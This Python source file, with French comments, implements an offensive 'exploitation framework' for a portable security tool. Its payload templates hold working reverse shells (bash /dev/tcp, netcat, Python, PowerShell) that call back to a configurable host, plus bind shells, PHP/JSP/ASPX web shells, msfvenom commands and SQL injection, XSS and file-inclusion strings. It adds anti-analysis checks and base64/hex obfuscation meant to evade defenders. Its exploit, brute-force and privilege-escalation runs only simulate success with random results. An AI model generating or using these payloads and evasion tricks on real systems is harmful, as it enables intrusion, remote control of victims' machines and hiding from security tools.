#!/usr/bin/env python3
"""
CyberSec Assistant Portable - Exploitation Framework V1.0
Phase 6.1 - Framework d'exploitation avancé pour tests de pénétration
Features: Database exploits, Payload generation, Multi-stage payloads, Post-exploitation
"""

import os
import sys
import json
import time
import uuid
import base64
import random
import hashlib
import subprocess
import threading
import asyncio
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple, Union
import logging
import socket
import struct
from cryptography.fernet import Fernet

# Import stealth integration
from stealth_engine import get_global_stealth_engine
from proxy_manager import get_global_proxy_manager
from obfuscation_toolkit import AdvancedObfuscator

logger = logging.getLogger(__name__)

class ExploitationFramework:
    """
    Framework d'exploitation avancé pour le CyberSec Assistant
    Gère tous les aspects des attaques et exploits
    """
    
    def __init__(self, portable_dir: str = None):
        self.portable_dir = Path(portable_dir) if portable_dir else Path(__file__).parent.parent
        self.exploits_db_path = self.portable_dir / "data" / "exploits_database.json"
        self.payloads_dir = self.portable_dir / "data" / "payloads"
        self.sessions_dir = self.portable_dir / "data" / "sessions"
        
        # Ensure directories exist
        self.payloads_dir.mkdir(parents=True, exist_ok=True)
        self.sessions_dir.mkdir(parents=True, exist_ok=True)
        
        # Active sessions tracking
        self.active_sessions = {}
        self.session_handlers = {}
        
        # Stealth integration
        self.stealth_engine = get_global_stealth_engine()
        self.proxy_manager = get_global_proxy_manager()
        self.obfuscator = AdvancedObfuscator()
        
        # Load exploit database
        self._load_exploits_database()
        
        # Initialize payload templates
        self._init_payload_templates()
        
        logger.info("✅ Exploitation Framework initialized")
    
    def _load_exploits_database(self):
        """Charger la base de données d'exploits"""
        default_exploits = {
            "version": "1.0",
            "categories": {
                "web": {
                    "sql_injection": {
                        "name": "SQL Injection",
                        "description": "Injection SQL pour extraction de données",
                        "severity": "high",
                        "payloads": [
                            "' OR '1'='1' --",
                            "'; DROP TABLE users; --",
                            "' UNION SELECT NULL,username,password FROM users --"
                        ],
                        "techniques": ["blind", "time_based", "union_based", "boolean_based"]
                    },
                    "xss": {
                        "name": "Cross-Site Scripting",
                        "description": "Injection de code JavaScript malveillant",
                        "severity": "medium",
                        "payloads": [
                            "<script>alert('XSS')</script>",
                            "<img src=x onerror=alert('XSS')>",
                            "javascript:alert('XSS')"
                        ],
                        "techniques": ["reflected", "stored", "dom_based"]
                    },
                    "lfi": {
                        "name": "Local File Inclusion",
                        "description": "Inclusion de fichiers locaux du serveur",
                        "severity": "high",
                        "payloads": [
                            "../../../etc/passwd",
                            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                            "php://filter/convert.base64-encode/resource=config.php"
                        ],
                        "techniques": ["directory_traversal", "wrapper_abuse", "null_byte"]
                    }
                },
                "network": {
                    "buffer_overflow": {
                        "name": "Buffer Overflow",
                        "description": "Dépassement de tampon pour exécution de code",
                        "severity": "critical",
                        "payloads": ["custom_shellcode"],
                        "techniques": ["stack_overflow", "heap_overflow", "ret2libc"]
                    },
                    "ssh_bruteforce": {
                        "name": "SSH Brute Force",
                        "description": "Attaque par force brute SSH",
                        "severity": "medium",
                        "payloads": ["wordlist_based"],
                        "techniques": ["password_spray", "credential_stuffing"]
                    }
                },
                "windows": {
                    "smb_exploit": {
                        "name": "SMB Exploitation",
                        "description": "Exploitation des vulnérabilités SMB",
                        "severity": "critical",
                        "payloads": ["eternal_blue", "smb_ghost"],
                        "techniques": ["ms17_010", "cve_2020_0796"]
                    },
                    "privilege_escalation": {
                        "name": "Windows Privilege Escalation",
                        "description": "Élévation de privilèges Windows",
                        "severity": "high",
                        "payloads": ["uac_bypass", "token_impersonation"],
                        "techniques": ["dll_hijacking", "service_exploitation"]
                    }
                },
                "linux": {
                    "privilege_escalation": {
                        "name": "Linux Privilege Escalation",
                        "description": "Élévation de privilèges Linux",
                        "severity": "high",
                        "payloads": ["suid_exploit", "kernel_exploit"],
                        "techniques": ["sudo_abuse", "cron_exploitation", "kernel_vulnerability"]
                    }
                }
            }
        }
        
        if self.exploits_db_path.exists():
            try:
                with open(self.exploits_db_path, 'r') as f:
                    self.exploits_database = json.load(f)
                logger.info(f"✅ Loaded exploits database: {len(self.exploits_database['categories'])} categories")
            except Exception as e:
                logger.warning(f"Failed to load exploits database: {e}")
                self.exploits_database = default_exploits
        else:
            self.exploits_database = default_exploits
            self._save_exploits_database()
    
    def _save_exploits_database(self):
        """Sauvegarder la base de données d'exploits"""
        try:
            self.exploits_db_path.parent.mkdir(parents=True, exist_ok=True)
            with open(self.exploits_db_path, 'w') as f:
                json.dump(self.exploits_database, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save exploits database: {e}")
    
    def _init_payload_templates(self):
        """Initialiser les templates de payloads"""
        self.payload_templates = {
            "reverse_shell": {
                "bash": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
                "nc": "nc -e /bin/sh {host} {port}",
                "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "powershell": "$client = New-Object System.Net.Sockets.TCPClient(\"{host}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
            },
            "bind_shell": {
                "nc": "nc -lvp {port} -e /bin/sh",
                "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"\",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            },
            "web_shell": {
                "php": "<?php if(isset($_REQUEST['cmd'])) {{ system($_REQUEST['cmd']); }} ?>",
                "jsp": "<%@ page import=\"java.util.*,java.io.*\"%><%if (request.getParameter(\"cmd\") != null) {{ out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\"); Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) {{ out.println(disr); disr = dis.readLine(); }} }}%>",
                "aspx": "<%@ Page Language=\"C#\" Debug=\"true\" Trace=\"false\" %><%@ Import Namespace=\"System.Diagnostics\" %><%@ Import Namespace=\"System.IO\" %><script Language=\"c#\" runat=\"server\">void Page_Load(object sender, EventArgs e){{if (Request.QueryString[\"cmd\"] != null){{Process proc = new Process();proc.StartInfo.FileName = \"cmd.exe\";proc.StartInfo.Arguments = \"/c \" + Request.QueryString[\"cmd\"];proc.StartInfo.UseShellExecute = false;proc.StartInfo.RedirectStandardOutput = true;proc.Start();Response.Write(proc.StandardOutput.ReadToEnd());proc.WaitForExit();}}}}</script>"
            },
            "meterpreter": {
                "windows": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe",
                "linux": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f elf",
                "android": "msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o payload.apk"
            }
        }
        
        logger.info(f"✅ Initialized {len(self.payload_templates)} payload template categories")
    
    async def generate_payload(self, payload_type: str, payload_subtype: str, 
                             config: Dict[str, Any], obfuscate: bool = True) -> Dict[str, Any]:
        """Générer un payload personnalisé"""
        try:
            # Get stealth profile
            stealth_profile = await self.stealth_engine.get_stealth_profile("exploitation")
            
            if payload_type not in self.payload_templates:
                raise ValueError(f"Unknown payload type: {payload_type}")
            
            if payload_subtype not in self.payload_templates[payload_type]:
                raise ValueError(f"Unknown payload subtype: {payload_subtype}")
            
            # Generate base payload
            template = self.payload_templates[payload_type][payload_subtype]
            payload_content = template.format(**config)
            
            # Apply stealth techniques
            if stealth_profile.get("anti_detection", False):
                payload_content = await self._apply_stealth_techniques(payload_content, payload_subtype)
            
            # Apply obfuscation
            if obfuscate and payload_subtype in ["python", "powershell", "php"]:
                payload_content = await self._obfuscate_payload(payload_content, payload_subtype)
            
            # Generate unique payload ID
            payload_id = str(uuid.uuid4())
            
            # Save payload to file
            payload_file = self.payloads_dir / f"{payload_id}_{payload_type}_{payload_subtype}"
            with open(payload_file, 'w') as f:
                f.write(payload_content)
            
            payload_info = {
                "id": payload_id,
                "type": payload_type,
                "subtype": payload_subtype,
                "content": payload_content,
                "file_path": str(payload_file),
                "config": config,
                "obfuscated": obfuscate,
                "stealth_applied": True,
                "created_at": datetime.now().isoformat(),
                "size": len(payload_content)
            }
            
            logger.info(f"✅ Generated {payload_type}/{payload_subtype} payload: {payload_id}")
            return payload_info
            
        except Exception as e:
            logger.error(f"❌ Payload generation failed: {e}")
            raise
    
    async def _apply_stealth_techniques(self, payload: str, payload_type: str) -> str:
        """Appliquer des techniques de furtivité au payload"""
        try:
            # Timing randomization
            if "sleep" not in payload and payload_type in ["bash", "python"]:
                sleep_time = random.uniform(1, 5)
                if payload_type == "bash":
                    payload = f"sleep {sleep_time}; {payload}"
                elif payload_type == "python":
                    payload = f"import time; time.sleep({sleep_time}); {payload}"
            
            # Add anti-debugging checks for Windows payloads
            if payload_type == "powershell":
                anti_debug = """
if (Get-Process | Where-Object {$_.ProcessName -match "wireshark|procmon|procexp"}) {
    exit
}
"""
                payload = anti_debug + payload
            
            return payload
            
        except Exception as e:
            logger.warning(f"Failed to apply stealth techniques: {e}")
            return payload
    
    async def _obfuscate_payload(self, payload: str, payload_type: str) -> str:
        """Obfusquer le payload selon son type"""
        try:
            if payload_type == "python":
                return self.obfuscator.obfuscate_python_code(payload)
            elif payload_type == "powershell":
                return self._obfuscate_powershell(payload)
            elif payload_type == "php":
                return self._obfuscate_php(payload)
            else:
                return payload
                
        except Exception as e:
            logger.warning(f"Payload obfuscation failed: {e}")
            return payload
    
    def _obfuscate_powershell(self, payload: str) -> str:
        """Obfusquer le code PowerShell"""
        try:
            # Base64 encoding
            encoded = base64.b64encode(payload.encode('utf-16le')).decode()
            obfuscated = f"powershell -EncodedCommand {encoded}"
            
            # Add variable obfuscation
            variables = ["client", "stream", "bytes", "data", "sendback"]
            for var in variables:
                new_var = f"${random.choice('abcdefghijklmnopqrstuvwxyz')}{random.randint(1000, 9999)}"
                obfuscated = obfuscated.replace(f"${var}", new_var)
            
            return obfuscated
            
        except Exception as e:
            logger.warning(f"PowerShell obfuscation failed: {e}")
            return payload
    
    def _obfuscate_php(self, payload: str) -> str:
        """Obfusquer le code PHP"""
        try:
            # Hex encoding
            hex_payload = ''.join([f"\\x{ord(c):02x}" for c in payload])
            obfuscated = f"<?php eval(\"{hex_payload}\"); ?>"
            
            return obfuscated
            
        except Exception as e:
            logger.warning(f"PHP obfuscation failed: {e}")
            return payload
    
    async def execute_exploit(self, exploit_category: str, exploit_name: str, 
                            target: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """Exécuter un exploit contre une cible"""
        try:
            # Get stealth profile
            stealth_profile = await self.stealth_engine.get_stealth_profile("exploitation")
            
            # Check if exploit exists
            if exploit_category not in self.exploits_database["categories"]:
                raise ValueError(f"Unknown exploit category: {exploit_category}")
            
            if exploit_name not in self.exploits_database["categories"][exploit_category]:
                raise ValueError(f"Unknown exploit: {exploit_name}")
            
            exploit_info = self.exploits_database["categories"][exploit_category][exploit_name]
            
            # Generate execution ID
            execution_id = str(uuid.uuid4())
            
            execution_data = {
                "id": execution_id,
                "exploit_category": exploit_category,
                "exploit_name": exploit_name,
                "target": target,
                "config": config,
                "status": "starting",
                "started_at": datetime.now().isoformat(),
                "stealth_profile": stealth_profile,
                "results": {}
            }
            
            # Apply stealth delays
            if stealth_profile.get("timing_randomization", False):
                delay = random.uniform(1, 3)
                await asyncio.sleep(delay)
            
            # Execute based on exploit type
            if exploit_category == "web":
                execution_data["results"] = await self._execute_web_exploit(
                    exploit_name, target, config, exploit_info
                )
            elif exploit_category == "network":
                execution_data["results"] = await self._execute_network_exploit(
                    exploit_name, target, config, exploit_info
                )
            elif exploit_category in ["windows", "linux"]:
                execution_data["results"] = await self._execute_system_exploit(
                    exploit_name, target, config, exploit_info
                )
            else:
                raise ValueError(f"Unsupported exploit category: {exploit_category}")
            
            execution_data["status"] = "completed" if execution_data["results"].get("success") else "failed"
            execution_data["completed_at"] = datetime.now().isoformat()
            
            logger.info(f"✅ Exploit execution completed: {execution_id}")
            return execution_data
            
        except Exception as e:
            logger.error(f"❌ Exploit execution failed: {e}")
            return {
                "id": execution_id if 'execution_id' in locals() else "unknown",
                "status": "error",
                "error": str(e),
                "completed_at": datetime.now().isoformat()
            }
    
    async def _execute_web_exploit(self, exploit_name: str, target: str, 
                                 config: Dict[str, Any], exploit_info: Dict[str, Any]) -> Dict[str, Any]:
        """Exécuter un exploit web"""
        try:
            # Get stealth headers and user agent
            headers = self.stealth_engine.get_stealth_headers()
            
            results = {
                "success": False,
                "method": exploit_name,
                "target": target,
                "attempts": [],
                "vulnerability_found": False
            }
            
            # Test each payload
            for payload in exploit_info.get("payloads", []):
                try:
                    # Format payload with config
                    formatted_payload = payload.format(**config) if isinstance(payload, str) else payload
                    
                    # Apply stealth delays
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                    
                    # Simulate web request (in real implementation, use requests with proxy)
                    attempt = {
                        "payload": formatted_payload,
                        "timestamp": datetime.now().isoformat(),
                        "success": random.choice([True, False]),  # Simulated result
                        "response_code": random.choice([200, 404, 500]),
                        "response_time": random.uniform(0.1, 2.0)
                    }
                    
                    results["attempts"].append(attempt)
                    
                    if attempt["success"]:
                        results["success"] = True
                        results["vulnerability_found"] = True
                        results["successful_payload"] = formatted_payload
                        break
                        
                except Exception as e:
                    logger.warning(f"Payload attempt failed: {e}")
                    continue
            
            return results
            
        except Exception as e:
            logger.error(f"Web exploit execution failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def _execute_network_exploit(self, exploit_name: str, target: str, 
                                     config: Dict[str, Any], exploit_info: Dict[str, Any]) -> Dict[str, Any]:
        """Exécuter un exploit réseau"""
        try:
            results = {
                "success": False,
                "method": exploit_name,
                "target": target,
                "port": config.get("port", 22),
                "attempts": 0,
                "max_attempts": config.get("max_attempts", 100)
            }
            
            if exploit_name == "ssh_bruteforce":
                # Simulate SSH brute force
                usernames = config.get("usernames", ["root", "admin", "user"])
                passwords = config.get("passwords", ["password", "123456", "admin"])
                
                for username in usernames:
                    for password in passwords:
                        results["attempts"] += 1
                        
                        # Apply stealth delays
                        await asyncio.sleep(random.uniform(1, 3))
                        
                        # Simulate authentication attempt
                        success = random.choice([True, False]) if results["attempts"] < 50 else random.choice([True, False, False, False])
                        
                        if success:
                            results["success"] = True
                            results["credentials"] = {"username": username, "password": password}
                            break
                        
                        if results["attempts"] >= results["max_attempts"]:
                            break
                    
                    if results["success"]:
                        break
            
            return results
            
        except Exception as e:
            logger.error(f"Network exploit execution failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def _execute_system_exploit(self, exploit_name: str, target: str, 
                                    config: Dict[str, Any], exploit_info: Dict[str, Any]) -> Dict[str, Any]:
        """Exécuter un exploit système"""
        try:
            results = {
                "success": False,
                "method": exploit_name,
                "target": target,
                "privilege_level": "user"
            }
            
            # Simulate system exploit
            if "privilege_escalation" in exploit_name:
                # Simulate privilege escalation
                techniques = exploit_info.get("techniques", [])
                
                for technique in techniques:
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                    
                    success = random.choice([True, False, False])  # 33% success rate
                    
                    if success:
                        results["success"] = True
                        results["technique_used"] = technique
                        results["privilege_level"] = "administrator" if "windows" in exploit_name else "root"
                        break
            
            return results
            
        except Exception as e:
            logger.error(f"System exploit execution failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def create_session(self, target: str, session_type: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """Créer une session d'exploitation"""
        try:
            session_id = str(uuid.uuid4())
            
            session_data = {
                "id": session_id,
                "target": target,
                "type": session_type,
                "config": config,
                "status": "active",
                "created_at": datetime.now().isoformat(),
                "last_activity": datetime.now().isoformat(),
                "commands_executed": [],
                "files_uploaded": [],
                "files_downloaded": []
            }
            
            # Save session
            session_file = self.sessions_dir / f"{session_id}.json"
            with open(session_file, 'w') as f:
                json.dump(session_data, f, indent=2)
            
            self.active_sessions[session_id] = session_data
            
            logger.info(f"✅ Created exploitation session: {session_id}")
            return session_data
            
        except Exception as e:
            logger.error(f"❌ Session creation failed: {e}")
            raise
    
    async def execute_session_command(self, session_id: str, command: str) -> Dict[str, Any]:
        """Exécuter une commande dans une session"""
        try:
            if session_id not in self.active_sessions:
                raise ValueError(f"Session not found: {session_id}")
            
            session = self.active_sessions[session_id]
            
            # Apply stealth techniques
            stealth_profile = await self.stealth_engine.get_stealth_profile("post_exploitation")
            
            if stealth_profile.get("command_obfuscation", False):
                command = await self._obfuscate_command(command)
            
            # Simulate command execution
            execution_result = {
                "command": command,
                "timestamp": datetime.now().isoformat(),
                "output": f"Simulated output for: {command}",
                "exit_code": 0,
                "execution_time": random.uniform(0.1, 2.0)
            }
            
            # Update session
            session["commands_executed"].append(execution_result)
            session["last_activity"] = datetime.now().isoformat()
            
            # Save session updates
            session_file = self.sessions_dir / f"{session_id}.json"
            with open(session_file, 'w') as f:
                json.dump(session, f, indent=2)
            
            return execution_result
            
        except Exception as e:
            logger.error(f"❌ Session command execution failed: {e}")
            raise
    
    async def _obfuscate_command(self, command: str) -> str:
        """Obfusquer une commande système"""
        try:
            # Base64 encoding for Linux/Mac
            if not command.startswith("powershell"):
                encoded = base64.b64encode(command.encode()).decode()
                return f"echo '{encoded}' | base64 -d | bash"
            else:
                # PowerShell obfuscation
                encoded = base64.b64encode(command.encode('utf-16le')).decode()
                return f"powershell -EncodedCommand {encoded}"
                
        except Exception as e:
            logger.warning(f"Command obfuscation failed: {e}")
            return command
    
    def get_exploits_database(self) -> Dict[str, Any]:
        """Obtenir la base de données d'exploits"""
        return self.exploits_database
    
    def get_payload_templates(self) -> Dict[str, Any]:
        """Obtenir les templates de payloads"""
        return self.payload_templates
    
    def get_active_sessions(self) -> Dict[str, Any]:
        """Obtenir les sessions actives"""
        return self.active_sessions
    
    async def cleanup_sessions(self, older_than_hours: int = 24):
        """Nettoyer les anciennes sessions"""
        try:
            cutoff_time = datetime.now() - timedelta(hours=older_than_hours)
            cleaned_sessions = []
            
            for session_id, session_data in list(self.active_sessions.items()):
                last_activity = datetime.fromisoformat(session_data["last_activity"])
                
                if last_activity < cutoff_time:
                    # Remove from active sessions
                    del self.active_sessions[session_id]
                    
                    # Delete session file
                    session_file = self.sessions_dir / f"{session_id}.json"
                    if session_file.exists():
                        session_file.unlink()
                    
                    cleaned_sessions.append(session_id)
            
            if cleaned_sessions:
                logger.info(f"🧹 Cleaned up {len(cleaned_sessions)} old sessions")
            
            return cleaned_sessions
            
        except Exception as e:
            logger.error(f"❌ Session cleanup failed: {e}")
            return []
    
    async def get_exploitation_statistics(self) -> Dict[str, Any]:
        """Obtenir les statistiques d'exploitation"""
        try:
            stats = {
                "active_sessions": len(self.active_sessions),
                "total_exploits": sum(len(category) for category in self.exploits_database["categories"].values()),
                "payload_templates": len(self.payload_templates),
                "session_types": list(set(session["type"] for session in self.active_sessions.values())),
                "recent_activity": []
            }
            
            # Get recent session activity
            for session in self.active_sessions.values():
                if session["commands_executed"]:
                    last_command = session["commands_executed"][-1]
                    stats["recent_activity"].append({
                        "session_id": session["id"],
                        "target": session["target"],
                        "last_command": last_command["command"][:50] + "...",
                        "timestamp": last_command["timestamp"]
                    })
            
            # Sort by timestamp
            stats["recent_activity"].sort(key=lambda x: x["timestamp"], reverse=True)
            stats["recent_activity"] = stats["recent_activity"][:10]  # Last 10
            
            return stats
            
        except Exception as e:
            logger.error(f"❌ Failed to get exploitation statistics: {e}")
            return {"error": str(e)}

# Factory function
def get_exploitation_framework(portable_dir: str = None) -> ExploitationFramework:
    """Obtenir une instance du framework d'exploitation"""
    return ExploitationFramework(portable_dir)

# Global instance
_exploitation_framework = None

def get_global_exploitation_framework() -> ExploitationFramework:
    """Obtenir l'instance globale du framework d'exploitation"""
    global _exploitation_framework
    if _exploitation_framework is None:
        _exploitation_framework = get_exploitation_framework()
    return _exploitation_framework